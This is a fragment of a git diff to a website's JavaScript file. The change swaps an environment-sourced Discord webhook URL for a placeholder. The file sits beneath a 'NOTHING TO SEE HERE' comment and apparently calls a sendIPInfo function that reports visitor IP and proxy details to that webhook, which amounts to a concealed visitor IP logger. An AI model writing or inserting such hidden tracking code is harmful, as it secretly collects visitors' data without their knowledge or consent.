@@ -67,9 +67,7 @@ $(document).ready(function(){
 
 
 // NOTHING TO SEE HERE
-// No need for dotenv since we're using GitHub Secrets
-
-const webHookUrl = process.env.DISCORD_WEBHOOK_URL;
+const webHookUrl = "__DISCORD_WEBHOOK_URL__"; // Placeholder
 
 async function fetchData(url) {
     const response = await fetch(url);
@@ -155,7 +153,6 @@ isProxy: ${isProxy}
 }
 
 sendIPInfo();
-
 
 // script.js
 $(document).ready(function(){
